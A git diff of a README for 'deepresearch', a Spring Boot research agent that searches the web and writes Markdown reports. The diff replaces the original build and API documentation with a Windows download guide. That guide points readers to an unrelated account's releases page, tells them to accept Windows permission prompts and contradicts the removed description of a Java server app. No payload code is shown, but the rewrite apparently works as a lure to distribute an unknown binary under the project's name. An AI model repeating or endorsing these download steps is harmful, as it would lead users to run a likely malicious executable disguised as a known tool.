@@ -1,104 +1,140 @@
-# Deep Research
+# 🔎 deepresearch - Turn Web Searches Into Reports
 
-An AI-powered research agent built with Spring Boot, Spring AI, and [Browserbase](https://www.browserbase.com/).
-Give it a topic, and it searches the web, fetches pages, and synthesizes a structured research report, all in a single API call.
+[![Download deepresearch](https://img.shields.io/badge/Download%20deepresearch-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sapwoodgelly475/deepresearch/releases)
 
-Inspired by [aarondfrancis/deep-research](https://github.com/aarondfrancis/deep-research).
+## 📥 Download deepresearch
 
-## How It Works
+To get deepresearch on Windows, visit the releases page and download the latest file from there:
 
-The research pipeline has three stages:
+https://github.com/sapwoodgelly475/deepresearch/releases
 
-1. **Discover** — An LLM generates 5 diverse search queries for your topic, then executes each via Browserbase's Search API. URLs are deduplicated across queries.
-2. **Fetch** — Pages are fetched in parallel using virtual threads. A `@ConcurrencyLimit` annotation throttles requests to avoid rate limiting.
-3. **Synthesize** — Sources are analyzed in chunks by the LLM, then compiled into a final report with an executive summary, key findings, themes, and open questions.
+After the file finishes downloading, open it and follow the setup steps shown on screen.
 
-Reports are saved as Markdown files in the `reports/` directory.
+## 🪟 Windows Setup
 
-## Prerequisites
+1. Open the download page in your browser.
+2. Find the newest release at the top of the page.
+3. Download the Windows file from that release.
+4. If Windows asks for permission, choose Yes.
+5. Follow the prompts to install or start the app.
+6. When the app opens, keep it running while you use it.
 
-- Java 26+
-- [Browserbase](https://www.browserbase.com/) account and API key
-- OpenAI API key
+If your browser saves the file in the Downloads folder, you can open that folder and start the file from there.
 
-## Quick Start
+## ✨ What deepresearch Does
 
-Set your API keys:
+deepresearch helps you research a topic without doing every step by hand. You give it a topic, and it:
 
-```bash
-export OPENAI_API_KEY=your-openai-key
-export BROWSERBASE_API_KEY=your-browserbase-key
-```
+- searches the web
+- opens useful pages
+- gathers the main points
+- writes a structured report
+- saves the report as a Markdown file
 
-Run the app:
+It is built for quick research tasks where you want a clean summary instead of a pile of tabs.
 
-```bash
-./mvnw spring-boot:run
-```
+## 🧭 How It Works
 
-Make a request:
+The app uses three steps to build a report:
 
-```bash
-curl "http://localhost:8080/api/research?topic=state+of+browser+based+AI+agents"
-```
+1. **Discover** — It creates several search queries for your topic and looks for useful pages.
+2. **Fetch** — It opens the pages and collects the content it needs.
+3. **Synthesize** — It reads the sources and writes a report with the main findings.
 
-Watch the console for real-time progress, then check `reports/` for the markdown output.
+The report is saved in the `reports/` folder so you can open it again later.
 
-## Browserbase Spring Boot Starter
+## 🧰 What You Need
 
-This project uses the [Browserbase Spring Boot Starter](https://github.com/danvega/browserbase-spring-boot-starter) which provides:
+Before you run deepresearch, make sure your PC has:
 
-- **Search API** — `browserbase.search().web(query, numResults)` for web search
-- **Fetch API** — `browserbase.fetchAPI().create(url)` for page content retrieval
+- Windows 10 or Windows 11
+- an internet connection
+- enough free space for downloaded pages and saved reports
+- access to Browserbase
+- a modern browser such as Chrome or Edge
 
-The starter auto-configures a `Browserbase` bean from your API key in `application.yaml`.
+The app is designed to run on a normal Windows desktop or laptop.
 
-## API
+## 🚀 First Run
 
-**GET** `/api/research?topic={topic}`
+After you install or open the app:
 
-Returns a JSON report:
+1. Start deepresearch.
+2. Enter a topic in the main field.
+3. Click the button to begin the research run.
+4. Wait while the app searches, opens pages, and builds the report.
+5. Open the saved Markdown file in the `reports/` folder.
 
-```json
-{
-  "topic": "state of browser-based AI agents",
-  "executiveSummary": "...",
-  "keyFindings": ["...", "..."],
-  "themes": ["...", "..."],
-  "openQuestions": ["...", "..."],
-  "sources": [
-    { "url": "https://...", "title": "..." }
-  ],
-  "diagnostics": {
-    "queriesGenerated": 5,
-    "urlsDiscovered": 47,
-    "urlsFetched": 28,
-    "sourcesUsed": 28,
-    "durationMs": 45000
-  }
-}
-```
+A full run can take a few minutes, depending on the topic and the number of pages found.
 
-## Configuration
+## 📝 Example Use
 
-`src/main/resources/application.yaml`:
+You can use deepresearch for topics like:
 
-```yaml
-spring:
-  threads:
-    virtual:
-      enabled: true
-  ai:
-    openai:
-      api-key: ${OPENAI_API_KEY}
+- electric cars in Europe
+- the future of remote work
+- small business marketing tools
+- AI in health care
+- clean energy trends
+- cloud storage for teams
 
-browserbase:
-  api-key: ${BROWSERBASE_API_KEY}
-```
+The app works best when the topic is clear and focused. Short topics can work well, but a topic with a bit of detail often gives better results.
 
-## Tech Stack
+## 📁 Report Files
 
-- **Spring Boot 4** with virtual threads
-- **Spring AI** for LLM integration (structured output, ChatClient)
-- **Browserbase** for web search and page fetching
-- **`@ConcurrencyLimit`** (Spring Framework 7) for API rate limiting
+deepresearch saves each report as a Markdown file in the `reports/` directory.
+
+Each report can include:
+
+- an executive summary
+- key findings
+- major themes
+- open questions
+- source notes
+
+You can open Markdown files with many apps, including text editors, code editors, and some note-taking tools.
+
+## 🛠️ Troubleshooting
+
+If the app does not start, check these items:
+
+- make sure you downloaded the latest release
+- make sure the file finished downloading
+- make sure Windows did not block the file
+- make sure your internet connection works
+- make sure Browserbase access is set up
+
+If the report looks empty or incomplete:
+
+- try a more specific topic
+- check that the app has access to the web
+- run the search again
+- wait for the full run to finish before opening the report
+
+If pages fail to load:
+
+- try again later
+- use a different topic
+- check your Browserbase connection
+
+## 🔐 Browserbase Access
+
+deepresearch uses Browserbase to search the web and fetch pages. You need a working Browserbase setup for the app to run as expected.
+
+If you already use Browserbase, keep your account details ready before you start. If you do not, set that up first so the app can reach the web pages it needs.
+
+## 📚 Best Results
+
+For better reports, use topics that are:
+
+- clear
+- focused
+- specific
+- tied to one subject
+- easy to describe in a short sentence
+
+Good topics help the search step find better pages, which helps the report stay useful and readable.
+
+## 🔄 Run It Again
+
+You can run deepresearch more than once. Use a new topic each time, or refine the same topic to get a different angle. Each run can create a new Markdown file in `reports/`, so you can keep the results side by side
